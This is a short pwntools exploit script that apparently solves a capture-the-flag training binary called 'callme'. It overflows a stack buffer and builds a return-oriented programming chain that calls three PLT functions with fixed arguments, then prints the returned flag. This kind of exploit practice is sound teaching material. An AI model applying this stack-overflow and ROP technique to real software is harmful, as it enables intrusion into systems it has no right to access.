from pwn import *

context(arch="amd64", os="linux", endian="little")
p = process("./callme")
elf = ELF("./callme")
rop = ROP("./callme")

def callme(callme_function):
    ropchain =  p64(rop.find_gadget(["pop rdi", "ret"])[0])
    ropchain += p64(0xDEADBEEFDEADBEEF)
    ropchain += p64(rop.find_gadget(["pop rsi", "pop rdx", "ret"])[0])
    ropchain += p64(0xCAFEBABECAFEBABE)
    ropchain += p64(0xD00DF00DD00DF00D)
    ropchain += p64(callme_function)
    return ropchain

callme_one = elf.plt["callme_one"]
callme_two = elf.plt["callme_two"]
callme_three = elf.plt["callme_three"]

log.info(f"callme_one @ PLT: 0x{callme_one:x}")
log.info(f"callme_two @ PLT: 0x{callme_two:x}")
log.info(f"callme_three @ PLT: 0x{callme_three:x}")

payload =  b"\x00" * 0x28
payload += callme(callme_one)
payload += callme(callme_two)
payload += callme(callme_three)

log.info(f"Sending rop chain")

p.clean()
p.send(payload)
p.recvuntil(b"ROPE")

log.success(f"Flag: ROPE{p.recvline().decode()}")
